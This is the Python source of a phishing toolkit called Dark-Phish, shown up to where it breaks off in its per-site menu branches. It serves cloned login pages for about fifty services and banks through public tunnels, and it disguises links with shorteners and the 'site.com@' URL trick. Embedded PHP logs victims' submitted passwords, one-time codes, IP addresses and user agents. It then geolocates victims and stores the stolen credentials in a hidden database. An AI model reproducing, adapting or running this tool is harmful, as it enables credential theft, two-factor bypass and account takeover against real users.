#!/usr/bin/env python3
"""
Tool Name: Dark-Phish
Author: Sajjad
GitHub: https://github.com/Cyber-Anonymous
"""

import sys
try:
	import os
	import time
	from bs4 import BeautifulSoup
	import requests
	import platform, subprocess
	import wget
	import shutil
	import requests 
	import pyshorteners
	import sqlite3
	import argparse
	import shutil
	from tkinter import *
	from tkinter import messagebox
except ModuleNotFoundError as error:
	print(error)
	sys.exit()
	

version = "2.3.0"
host = "127.0.0.1"
port = "8080"

try:
	parser = argparse.ArgumentParser(add_help=False)
	parser.add_argument("-H", "--host", type=str)
	parser.add_argument("-p", "--port", type=str)

	if ("-h" in sys.argv or "--help" in sys.argv):
		print("""\033[1m
Name:
    Dark-Phish
    
Usage:
    python3 dark-phish.py [-h] [-H HOST] [-p PORT] [-u] [-v] [-r]
		
Version:
    {}
		
Options:
    -h,  --help                     Show this help massage.
    -H HOST, --host HOST            Specify the host address [Default : 127.0.0.1] . 
    -p PORT,  --port PORT           Web server port [Default : 8080] .
    -u,  --update                   Check for updates.
    -v,  --version                  Show version number and exit.
    -r,  --retrieve                 Retrieve saved credentials.
	\033[0;0m""".format(version))
		sys.exit()
	else:
		pass

	args = parser.parse_args()
	if ("-u" in sys.argv or "--update" in sys.argv):
		check_update()
		sys.exit()
	elif ("-v" in sys.argv or "--version" in sys.argv):
		print("\nDark-Phish version {}\n".format(version))
		sys.exit()
	elif ("-r" in sys.argv or "--retrieve" in sys.argv):
		database_management()
		sys.exit()
	else:
		pass

	if args.host:
		try:
			host = args.host
		except Exception as error:
			print(error)
	else:
		pass
			
	if args.port:
		try:
			port = args.port
		except Exception as error:
			print(error)
	else:
		pass
		
except Exception as error:
	print(error)
	sys.exit()


def printf(message, level):
	timestamp = time.strftime("%H:%M:%S", time.localtime())
	levels = {

		"INFO": "\033[1;92m[INFO]\033[0;0m",
		"WARNING": "\033[1;93m[WARNING]\033[0;0m",
		"ERROR": "\033[1;91m[ERROR]\033[0;0m"
	}

	print("\033[1;94m[{}]{}\033[0;0m {}".format(timestamp, levels.get(level), message))

def logo():
	print("")
	os.system("clear")
	print("""\033[1;91m
██████╗  █████╗ ██████╗ ██╗  ██╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝     ██╔══██╗██║  ██║██║██╔════╝██║  ██║
██║  ██║███████║██████╔╝█████╔╝█████╗██████╔╝███████║██║███████╗███████║
██║  ██║██╔══██║██╔══██╗██╔═██╗╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║
██████╔╝██║  ██║██║  ██║██║  ██╗     ██║     ██║  ██║██║███████║██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ \033[0;0mv{}
                                    \033[1;0m Coded by Sajjad | Cyber-Anonymous |

\033[0;0m""".format(version))

def disclaimer():         
	print(" \033[1;100;97m[::] Disclaimer: Developers are not responsible for any [::]\033[0;0;0m\n \033[1;100;97m[::] misuse or damage caused by Dark-Phish.             [::]\033[0;0;0m")



def check_update():
	try:
		version_url = "https://raw.githubusercontent.com/Cyber-Anonymous/Dark-Phish/main/version.txt"
	
		r = requests.get(version_url)
		status = r.status_code     
		if (status == 200):
			gh_version = float(r.text)  
			if (gh_version > version):
				print("\n\033[1;92mA new update (Version {}) is available for Dark-Phish.\033[0;0m\n".format(gh_version))
			else:
				print("\nAlready up to date.\n")
		else:
			print("\033[1;91mUnable to check updates! Please check your internet connection or try again later.\033[0;0m\n")
	except:
		print("\033[1;91mUnable to check updates! Please check your internet connection or try again later.\033[0;0m\n")


def user_pass(data):
	username = ""
	password = ""
	try:
		lines = data.split('\n')
		
		for line in lines:
			
			data = line.split(": ")
			if len(data) == 2:
				key =  data[0]
				value = data[1]
				if key == "Username":
					username = value 
				elif key == "Password":
					password = value
	except Exception as error:
		print(error)
	return username, password

	

def save_data(site, username, password, otp):
	
	os.chdir("..") 
	os.chdir("..") 
	try:
		
		conn = sqlite3.connect(".credentials.db")
		conn.execute("""
		CREATE TABLE IF NOT EXISTS data (
		id INTEGER PRIMARY KEY,
		site TEXT,
		username TEXT,
		password TEXT,
		otp TEXT
		)
		""")
		conn.execute("INSERT INTO data (site, username, password, otp) VALUES (?, ?, ?, ?)", (site, username, password, otp))
		conn.commit()
		print("\nCredentials saved to database.\n")
	except sqlite3.Error as error:
		print("Database error:", error)
	finally:
		conn.close()

def retrieve_data():
	conn = None
	try:
		if (os.path.exists("core/.credentials.db")):
			conn = sqlite3.connect("core/.credentials.db")
			data = conn.execute("SELECT * FROM data")
			print("")
			for line in data:
				print("ID:",line[0])
				print("Site:", line[1])
				print(line[2])
				print(line[3])
				print(line[4])
				print("")
		else:
			print("\n\033[1;91mError: Database file not found!\033[0;0m\n")
	except sqlite3.Error as error:
		print("Database error:", error)
		sys.exit()
	finally:
		if conn is not None:
			conn.close()
		else:
			pass

def delete_data():
	try:
		if (os.path.exists("core/.credentials.db")):
			os.remove("core/.credentials.db")
			print("\nDatabase file deleted successfully.\n")
		else:
			print("\n\033[1;91mError: Database file not found!\033[0;0m\n")
	except Exception as error:
		print(error)
		sys.exit()
	
def database_management():
	logo()
	disclaimer()
	print("")
	print("")
	print("""
Credentials Management Menu:
	
[\033[1;92m01\033[0;0m] Retrieve Credentials
[\033[1;92m02\033[0;0m] Delete Credentials
[\033[1;92m00\033[0;0m] Exit
""")

	while True:
		try:
			option = input("\nOPTION: ")
			option = int(option)
			break
		except:
			print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")
			
	if (option == 1):
		try:
			retrieve_data()
		except Exception as e:
			print(e)
			
	elif (option == 2):
		try:
			delete_data()
		except:
			pass
			
	elif (option == 0):
		sys.exit()
	
	else:
		print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")
	




ostype = subprocess.check_output(["uname","-o"]).strip()    
ostype = ostype.decode()

system = platform.system()     
arch = platform.architecture()    
machine = platform.machine()   






def localhost_server():
	pass



def download_ngrok():
	
	exist = os.path.exists("core/ngrok")
	
	if (exist==False):
		
		arm = "arm" in machine 
		
		if (ostype == "Android" or arm == True):
			
			file="ngrok-v3-stable-linux-arm.tgz"
			
		elif(system == "Linux" and arch[0] == "64bit"):
			file="ngrok-v3-stable-linux-amd64.tgz"
		
		elif (machine == "aarch64"):
			file = "ngrok-v3-stable-linux-amd64.tgz"
		
		elif(system == "Linux" and arch[0] == "32bit"):
			file="ngrok-v3-stable-linux-386.tgz"
			
		else:
			print("\n\033[1;91m[-] Permission denial!\033[0;0m")
			sys.exit()
			
		try:
			
			url="https://bin.equinox.io/c/bNyj1mQVY4c/"+file
			
			print("\n\033[1;92mDownloading ngrok...\033[0;0m")
			wget.download(url)
			os.system("tar zxvf "+file)
			os.system("chmod +x ngrok")
			authtoken = input("Ngrok authtoken: ")
			prefix = "ngrok config add-authtoken "
			if authtoken.startswith(prefix):
				authtoken = authtoken[len(prefix):].strip()
			else:
				pass

			os.system("./ngrok config add-authtoken {} > /dev/null 2>&1".format(authtoken))
			os.system("mv ngrok core")
			os.system("rm -rf "+file)
		except Exception as error:
			print(error)
			sys.exit()
	else:
		pass


def cloudflare_tunnel():
	exist = os.path.exists("core/cloudflared") 
	
	if (exist == False):
		
		if ostype == "Android" and arch[0] == "64bit":
		
			
			url = "https://github.com/cloudflare/cloudflared/releases/download/2023.8.2/cloudflared-linux-arm64"
			
		elif (ostype == "Android" and arch[0]) == "32bit":
			
			
			url = "https://github.com/cloudflare/cloudflared/releases/download/2023.8.2/cloudflared-linux-arm"
			
		elif (machine == "aarch64"):
			
			url = "https://github.com/cloudflare/cloudflared/releases/download/2023.8.2/cloudflared-linux-arm64"
			
		elif (machine == "x86_64"):
			
			url = "https://github.com/cloudflare/cloudflared/releases/download/2023.8.2/cloudflared-linux-amd64"
		
		else:
			
			
			url = "https://github.com/cloudflare/cloudflared/releases/download/2023.8.2/cloudflared-linux-386"
			
			
		
		print("\n\033[1;92mDownloading Cloudflared...\033[0;0m")
		try:
			filename = wget.download(url)
			os.rename(filename, "cloudflared")
			os.system("mv cloudflared core")
			os.system("chmod +x core/cloudflared")
		except Exception as error:
			print(error)
			sys.exit()
		
	else:
		pass



def localxpose_tunnel():
	exist = os.path.exists("core/loclx")
	if (exist == False):
		
		arm = "arm" in machine
		
		if (ostype == "Android" and arm == True ):
			url = "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip"
		
		elif (machine == "aarch64"):
			url = "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip"
		
		elif(machine == "x86_64"):
			url = "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip"
		
		else:
			url = "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip"
			
		print("\n\033[1;92mDownloading LocalXpose...\033[0;0m")
		
		try:
		
		
			filename = os.path.basename(url)
			os.system("wget {} > cache.tmp 2>&1".format(url))
			os.system("rm -rf cache.tmp")
			os.system("unzip " + filename)
			os.system("rm -rf " + filename)
			os.system("chmod +x loclx")
			os.system("./loclx account login")
			os.system("mv loclx core")
		except Exception as error:
			print(error)
			sys.exit()
	else:
		pass
		
def serveo_ssh_tunnel():
	pass


def local_tunnel():
	def is_localtunnel_installed():
		try:
			exist = subprocess.run(["lt", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, text=True)
			if (exist.returncode == 0):
				return True
			else:
				return False
		except FileNotFoundError:
			return False
	if (is_localtunnel_installed() == False):
		try:
			print("\033[1;92mInstalling localtunnel...")
			os.system("npm install -g localtunnel")
		except Exception as error:
			print(error)
	else:
		pass




logo()
disclaimer()
print("")
print("")

print("""

[\033[1;92m01\033[0;0m] Facebook      [\033[1;92m13\033[0;0m] Samsung ID   [\033[1;92m25\033[0;0m] Adobe         [\033[1;92m37\033[0;0m] Spotify       [\033[1;92m49\033[0;0m] Flipkart  
[\033[1;92m02\033[0;0m] Twitter       [\033[1;92m14\033[0;0m] WordPress    [\033[1;92m26\033[0;0m] Amazon        [\033[1;92m38\033[0;0m] TikTok        [\033[1;92m50\033[0;0m] PhonePe
[\033[1;92m03\033[0;0m] Instagram     [\033[1;92m15\033[0;0m] GitLab       [\033[1;92m27\033[0;0m] Ebay          [\033[1;92m39\033[0;0m] Discord       [\033[1;92mclone\033[0;0m] Clone
[\033[1;92m04\033[0;0m] Snapchat      [\033[1;92m16\033[0;0m] ProtonMail   [\033[1;92m28\033[0;0m] Netflix       [\033[1;92m40\033[0;0m] Daraz         [\033[1;92mcreate\033[0;0m] Create
[\033[1;92m05\033[0;0m] GitHub        [\033[1;92m17\033[0;0m] Linkedin     [\033[1;92m29\033[0;0m] Messenger     [\033[1;92m41\033[0;0m] WhatsApp      [\033[1;92mcustom\033[0;0m] Custom
[\033[1;92m06\033[0;0m] Google        [\033[1;92m18\033[0;0m] Steam        [\033[1;92m30\033[0;0m] Twitter-X     [\033[1;92m42\033[0;0m] Telegram      [\033[1;92m00\033[0;0m] Exit
[\033[1;92m07\033[0;0m] Yahoo         [\033[1;92m19\033[0;0m] Twitch       [\033[1;92m31\033[0;0m] Galaxy Store  [\033[1;92m43\033[0;0m] Signal
[\033[1;92m08\033[0;0m] PlayStation   [\033[1;92m20\033[0;0m] VK           [\033[1;92m32\033[0;0m] Google Drive  [\033[1;92m44\033[0;0m] Imo
[\033[1;92m09\033[0;0m] PayPal        [\033[1;92m21\033[0;0m] Pinterest    [\033[1;92m33\033[0;0m] Google Photos [\033[1;92m45\033[0;0m] bKash
[\033[1;92m10\033[0;0m] Microsoft     [\033[1;92m22\033[0;0m] Wi-Fi        [\033[1;92m34\033[0;0m] OneDrive      [\033[1;92m46\033[0;0m] Nagad 
[\033[1;92m11\033[0;0m] Dropbox       [\033[1;92m23\033[0;0m] Badoo        [\033[1;92m35\033[0;0m] Playstore     [\033[1;92m47\033[0;0m] DBBL(Rocket)
[\033[1;92m12\033[0;0m] Apple ID      [\033[1;92m24\033[0;0m] Bitcoin      [\033[1;92m36\033[0;0m] Snaptube      [\033[1;92m48\033[0;0m] Paytm
""")


while True:
	try:
		option=input("\nOPTION: ").lower()
		if option == "custom" or option == "clone" or option == "create":
			break
		else:
			pass
		option=int(option)
		break
	except:
		print("\n\033[1;91m[!] Invalid option!\033[0;0m\n")


if (option == 0): 
	sys.exit()
else:
	pass
	



print("""\n
[\033[1;92m01\033[0;0m] Localhost
[\033[1;92m02\033[0;0m] Ngrok
[\033[1;92m03\033[0;0m] Cloudflared 
[\033[1;92m04\033[0;0m] LocalXpose
[\033[1;92m05\033[0;0m] Serveo
[\033[1;92m06\033[0;0m] Localtunnel
""")
Tunnels = 6          
while True:
	try:
		tunnel = input("\nOPTION: ")
		tunnel = int(tunnel)
		if (tunnel > Tunnels):
			print("\033[1;91m[!] Invalid option!\033[0;0m\n")
		else:
			break
	except:
		print("\033[1;91m[!] Invalid option!\033[0;0m\n")


def start_php_server():
	os.system("""
	php -S {}:{} > /dev/null 2>&1 &
	sleep 4
	""".format(host, port))
	
def start_ngrok_server():
	os.system("""
	./ngrok http {} > /dev/null 2>&1 &
	sleep 10
			""".format(port))	




def is_gd(main_url):
	api = "https://is.gd/create.php?format=simple&url="
	url = api + main_url
	try:
		r = requests.get(url)
		if (r.status_code == 200):
			short = r.text.strip()
		else:
			short = None
		r.close()
		return short
	except:
		return None
		
def tiny_url(main_url):
	api = "https://tinyurl.com/api-create.php?url="
	url = api + main_url
	try:
		r = requests.get(url)
		if(r.status_code == 200):
			short = r.text.strip()
		elif(r.status_code != 200):
			shortener = pyshorteners.Shortener()
			short = shortener.tinyurl.short(main_url)
		else:
			short = None
		r.close()
		return short
	except:
		pass
		return None


def da_gd(main_url):
	api = "https://da.gd/s"
	data = {"url" : main_url}
	try:
		r = requests.post(api, data = data)
		if (r.status_code == 200):
			short = r.text.strip()
		else:
			short = None
		r.close()
		return short
	except:
		return None





def modify_url(keyword, url):
	shorted1 = is_gd(url)
	shorted2 = tiny_url(url)
	shorted3 = da_gd(url)
	modified_urls = []
		
	
	try:
		if("https" in url):
			url = url.replace("https://","",1)
		else:
			url = url.replace("http://","",1)
		modified_url1 = keyword + url   
		modified_urls.append(modified_url1)
	except:
		pass
		
		
	if shorted1:
		try:
			if("https" in shorted1):
				shorted1= shorted1.replace("https://","",1)
			else:
				shorted1 = shorted1.replace("http://","",1)
			modified_url2 = keyword + shorted1
			modified_urls.append(modified_url2)
		except:
			pass
		
		
	if shorted2:
		try:
			if("https" in shorted2):
				shorted2 = shorted2.replace("https://","",1) 
			else:
				shorted2 = shorted2.replace("http://","",1)
			modified_url3 = keyword + shorted2
			modified_urls.append(modified_url3)
		except:
			pass
		
		
	if shorted3:
		try:
			if("https" in shorted3):
				shorted3 = shorted3.replace("https://","",1)
			else:
				shorted3 = shorted3.replace("http://","",1)
			modified_url4 = keyword + shorted3
			modified_urls.append(modified_url4)
		except:
			pass
			
	return modified_urls
	

keywords = {
"Facebook" : "https://www.facebook.com@",
"Twitter" : "https://twitter.com@",
"Instagram" : "https://www.instagram.com@",
"Snapchat" :"https://www.snapchat.com@",
"GitHub" : "https://github.com@",
"Google" : "https://www.google.com@",
"Yahoo" : "https://login.yahoo.com@",
"PlayStation" : "https://www.playstation.com@",
"PayPal" : "https://www.paypal.com@",
"Microsoft" : "https://account.microsoft.com@",
"Dropbox" : "https://www.dropbox.com@",
"Apple ID" : "https://www.appleid.com@",
"Samsung ID" : "https://www.samsung.com@",
"WordPress" : "https://www.wordpress.com@",
"GitLab" : "https://gitlab.com@",
"ProtonMail" : "https://proton.me@",
"Linkedin" : "https://www.linkedin.com@",
"Steam" : "https://store.steampowered.com@",
"Twitch" : "https://www.twitch.tv@",
"VK" : "https://www.vk.com@",
"Pinterest" : "https://www.pinterest.com@",
"Wi-Fi" : "https://router-login@",
"Badoo" : "https://www.badoo.com",
"Bitcoin" : "https://bitcoin.org@",
"Adobe" : "https://www.adobe.com@",
"Amazon" : "https://www.amazon.com@",
"Ebay" : "https://www.ebay.com@",
"Netflix" : "https://www.netflix.com@",
"Messenger" : "https://www.messenger.com@",
"Custom" : "https://login@",
"X" : "https://twitter.com@",
"Galaxy_Store" : "https://www.samsung.com@",
"Google_Drive" : "https://drive.google.com@",
"Google_Photos" : "https://photos.google.com@",
"OneDrive" : "https://onedrive.microsoft.com@",
"PlayStore" : "https://play.google.com@",
"Snaptube" : "https://www.snaptube.com@",
"Spotify" : "https://open.spotify.com@",
"TikTok" : "https://www.tiktok.com@",
"Discord" : "https://www.discord.com@",
"Daraz" : "https://www.daraz.com@",
"Whatsapp" : "https://account.whatsapp.com@",
"Telegram" : "https://web.telegram.org@",
"Signal" : "https://www.signal.com@",
"Imo" : "https://imo.com@",
"Bkash" : "https://www.bkash.com.bd@",
"Nagad" : "https://www.nagad.com.bd@",
"Rocket" : "https://www.dutchbanglabank.com@",
"Paytm" : "https://paytm.com@",
"Flipkart" : "https://www.flipkart.com@",
"PhonePe" : "https://www.phonepe.com@",
}





def server(action):

	if args.host or args.port:
		print("\n\033[1;92mHOST:\033[0;0m {}".format(host))
		print("\033[1;92mPORT:\033[0;0m {}".format(port))


	def php_server():
		print("\n\033[1;92mStarting PHP server...\033[0;0m") 
		start_php_server() 
		os.chdir("../") 
		os.chdir("../") 


	if (tunnel == 1):
		print("\n\033[1;92mStarting PHP server...\033[0;0m")
		
		os.system("""
		php -S {}:{} > tunnel.txt 2>&1 & sleep 5
		""".format(host, port))
		
		os.system("""
		grep -o "http://[-0-9A-Za-z.:]*" "tunnel.txt" -oh > link.txt
		""")

		

	elif (tunnel ==  2):
		php_server()
		
		print("\033[1;92mStarting NGROK server...\033[0;0m")
		start_ngrok_server() 
		os.chdir("sites/{}".format(action))
		os.system("""
	curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9A-Za-z]*\\.ngrok-free.app" -oh > link.txt
	""")


	elif (tunnel == 3):
		php_server()
		
		print("\033[1;92mStarting Cloudflared tunnel...\033[0;0m")
		os.system("""./cloudflared --url {}:{} > tunnel.txt 2>&1 &
sleep 12""".format(host, port))

		shutil.move("tunnel.txt", "sites/{}".format(action)) 
		os.chdir("sites/{}".format(action))
		
		os.system("""grep -o "https://[-0-9A-Za-z]*\\.trycloudflare.com" "tunnel.txt" -oh > link.txt""")


	elif (tunnel == 4):
		php_server()
		
		print("\033[1;92mStarting LocalXpose tunnel...\033[0;0m")
		while True:
			os.system("""
		./loclx tunnel http --to {}:{} > tunnel.txt 2>&1 &
		sleep 10
		""".format(host, port))
			try:
				temp_file = open("tunnel.txt", 'r')
				temp_data = temp_file.read()
				temp_file.close()
				if ("unauthenticated access" in temp_data):
					os.system("rm -rf tunnel.txt")
					os.system("./loclx account status")
					os.system("./loclx account login")
				else:
					break
			except Exception as error:
					print(error)
					sys.exit()
				
		shutil.move("tunnel.txt","sites/{}".format(action))
		os.chdir("sites/{}".format(action))
		os.system("""
		grep -o "[-0-9A-Za-z]*\\.loclx.io" "tunnel.txt" -oh > link.txt""")
		temp = open("link.txt","r")
		link = temp.read()
		temp.close()
		file = open("link.txt","w")
		file.write("https://"+link)
		file.close()


	elif(tunnel == 5):
		php_server()
		
		print("\033[1;92mStarting Serveo tunnel...\033[0;0m")
		os.system("""ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:{}:{} serveo.net > tunnel.txt 2>&1 & sleep 10""".format(host, port))
		shutil.move("tunnel.txt","sites/{}".format(action))
		os.chdir("sites/{}".format(action))
		os.system("""
		grep -o "https://[-0-9a-z]*\\.serveo.net" "tunnel.txt" -oh > link.txt
		""")


	elif(tunnel == 6):
		php_server()
		
		print("\033[1;92mStarting Localtunnel...\033[0;0m")
		os.system("""lt --port {} > tunnel.txt 2>&1 & sleep 10""".format(port))
		shutil.move("tunnel.txt", "sites/{}".format(action))
		os.chdir("sites/{}".format(action))
		os.system("""
			grep -o "https://[-0-9a-z]*\\.loca.lt" "tunnel.txt" -oh > link.txt
			""")

	else:
		print("\033[1;91m[!] Invalid option!\033[0;0m\n")
		
	file = open("link.txt","r")
	link=file.read()
	file.close()
	
	if (len(link) > 0):
		try:
			condition = input("\nModify the URL (Y/N): ").lower()
			print("")
		except:
			pass
	else:
		condition = None
	print("\033[1;92mSend link:\033[0;0m",link)
	
	if (condition == "y" or condition == "yes"):
		keyword = keywords[action]
		modified = modify_url(keyword, link)
		for modified_url in modified:
			print("\033[1;92mSend link:\033[0;0m", modified_url)
	else:
		pass
	
	
	os.remove("link.txt")
	try:
		os.remove("tunnel.txt")
	except:
		pass
	
	return None



def stop():
	if (tunnel == 1):
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 2):
		os.system("killall ngrok > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill ngrok > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 3):
		os.system("killall cloudflared > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill cloudflared > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 4):
		os.system("killall loclx > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill loclx > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 5):
		os.system("killall ssh > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill ssh > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	elif (tunnel == 6):
		os.system("killall localtunnel > /dev/null 2>&1")
		os.system("killall php > /dev/null 2>&1")
		os.system("pkill localtunnel > /dev/null 2>&1")
		os.system("pkill php > /dev/null 2>&1")
	
	else:
		sys.exit()
	return None

	
def work():
	try:
		print("")
		while not (os.path.exists("log.txt")):
			print("\r\033[1;92mWaiting for the credentials   \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mWaiting for the credentials.  \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mWaiting for the credentials.. \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mWaiting for the credentials...\033[0;0m",end="")
			time.sleep(1)
			if (os.path.exists("log.txt") == True):
				print("\r\033[1;92mCredentials found.            \033[0;0m")
			
	except:
		stop()
		sys.exit()


	try:
		log_file=open("log.txt","r")
		log=log_file.read()
		log_file.close()
	except:
		pass
	return log
	
def work_otp():
	otp_code = ""
	
	try:
		print("")
		while not (os.path.exists("log.txt")):
			log = work()
			print("")
			username, password = extract_data(log)

		while not (os.path.exists("otp.txt")):
			print("\r\033[1;92mWaiting for the otp   \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mWaiting for the otp.  \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mWaiting for the otp.. \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mWaiting for the otp...\033[0;0m",end="")
			time.sleep(1)
			if (os.path.exists("otp.txt") == True):
				print("\r                                             ",end="\r")
				try:
					otp_file = open("otp.txt","r")
					otp = otp_file.read()
					otp_file.close()
					print(otp)
					otp_code = otp.split(": ")[1]
				except:
					pass
	except:
		stop()
		sys.exit()

	return username, password, otp_code


def display_credentials():
	try:
		print("")
		while not (os.path.exists("log.txt")):

			print("\r\033[1;92mWaiting for the credentials   \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mWaiting for the credentials.  \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mWaiting for the credentials.. \033[0;0m",end="")
			time.sleep(1)
			print("\r\033[1;92mWaiting for the credentials...\033[0;0m",end="")
			time.sleep(1)
			if (os.path.exists("log.txt") == True):
				print("\r\033[1;92m[{}] Credentials found.            \033[0;0m".format(time.strftime("%H:%M:%S", time.localtime())))
				print("")
			
	except:
		stop()
		sys.exit()
	
	try:
		with open("log.txt", "r") as log_file:

			while True:

				data = log_file.readline().strip()
				if data:
					printf(data, level="INFO")
				else:
					time.sleep(1)
	except:
		pass



def ip_data():
	try:
		ipfile=open("ip.txt","r")
		line=ipfile.readline()
		ipfile.close()
		os.remove("ip.txt")
		ip=line.replace("IP: ","",1)
		ip=str(ip.strip())
		url="http://ip-api.com/json/{}".format(ip)
		data=requests.get(url).json()
		status=data["status"].lower()
		if (status=="success"):
			colour = "\033[1;32m"
		else:
			colour = "\033[1;31m"
		print("\n{}IP STATUS {}\033[0;0m".format(colour,status.upper()))
	except:
		pass
	try:
		if (status=="success"):
			action=input("\nSee more credentials (Y/N): ").lower()
			print("")
			if(action=="y"):
				print("\033[1;92mIP:\033[0;0m",data["query"])
				print("\033[1;92mCountry:\033[0;0m",data["country"])
				print("\033[1;92mCountry code:\033[0;0m",data["countryCode"])
				print("\033[1;92mCity:\033[0;0m",data["city"])
				print("\033[1;92mRegion:\033[0;0m",data["region"])
				print("\033[1;92mRegion name:\033[0;0m",data["regionName"])
				print("\033[1;92mZip:\033[0;0m",data["zip"])
				
				
				print("\033[1;92mLocation:\033[0;0m {},{}".format(data["lat"], data["lon"]))
				print("\033[1;92mTime zone:\033[0;0m",data["timezone"])
				print("\033[1;92mISP:\033[0;0m", data["isp"])
			elif(action=="n"):
				pass
		elif(status=="fail"):
			pass
		else:
			pass
		print("")
	except:
		pass
	return None


def login_php(action_url):
	code = f"""<?php
header ('Location: {action_url}');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {{
fwrite($handle, $variable);
fwrite($handle, " => ");
fwrite($handle, $value);
fwrite($handle, "\\r\\n");
}}
fwrite($handle, "\\r\\n\\n");
fclose($handle);
exit;
?>"""
	return code

def ip_php():
	code = """<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\\r\\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\\r\\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\\r\\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);


fclose($fp);
?>"""

	return code


def index_php():
	code = """<?php
include 'ip.php';
header('Location: index.html');
exit
?>"""
	return code


def available_tunnels():
	
	if (tunnel == 0):
		sys.exit()
	elif (tunnel == 1):
		localhost_server()
	elif (tunnel == 2):
		download_ngrok()
	elif (tunnel == 3):
		cloudflare_tunnel()
	elif (tunnel == 4):
		localxpose_tunnel()
	elif(tunnel == 5):
		serveo_ssh_tunnel()
	elif(tunnel == 6):
		local_tunnel()
	else:
		print("\033[1;91m[!] Invalid option!\033[0;0m\n")
			

def extract_key_value(line):
	if "=" in line:
		key, value = line.split("=", 1)

		return key, value.strip()
	return None, None

def extract_data(log):
	username = None
	password = None
	for line in log.splitlines():
		key, value = extract_key_value(line)
		if key:
			if any(k in key.lower() for k in ["username", "email", "user", "usernameoremail", "login", "j_username", "login_email", "login_username", "userid", "userloginid"]):
				username = value
			elif any(k in key.lower() for k in ["password", "passwd", "pass", "j_password", "login_password"]):
				password = value

	if username:
		username = "Username: {}".format(username)
		print(username)
	if password:
		password = "Password: {}".format(password)
		print(password)

	return username, password


if (option==1):
	try:
		site = "Facebook"
		available_tunnels()
		os.chdir("core/sites/Facebook")
		server("Facebook")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)

elif (option==2):
	try:
		site = "Twitter"
		available_tunnels()
		os.chdir("core/sites/Twitter")
		server("Twitter")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
	
elif (option==3):
	try:
		site = "Instagram"
		available_tunnels()
		os.chdir("core/sites/Instagram")
		server("Instagram")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
elif (option==4):
	try:
		site = "Snapchat"
		available_tunnels()
		os.chdir("core/sites/Snapchat")
		server("Snapchat")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
elif (option==5):
	try:
		site = "GitHub"
		available_tunnels()
		os.chdir("core/sites/GitHub")
		server("GitHub")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
elif (option==6):
	try:
		site = "Google"
		available_tunnels()
		os.chdir("core/sites/Google")
		server("Google")
		work()
		log=work()
		otp = ""
		username, password = extract_data(log)
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
		
elif (option==7):
	try:
		site = "Yahoo"
		available_tunnels()
		os.chdir("core/sites/Yahoo")
		server("Yahoo")
		work()
		log=work()
		otp = ""

		username, password = extract_data(log)
		stop()
		ip_data()
		try:
			os.remove("log.txt")
		except:
			pass
		save_data(site, username, password, otp)
	except Exception as error:
		print(error)
	
elif (option==8):
	try:
		site = "PlayStation"
		available_tunnels()
		os.chdir("core/sites/PlayStation")
		server("PlayStation")
		work()
		log=work()
		otp = ""

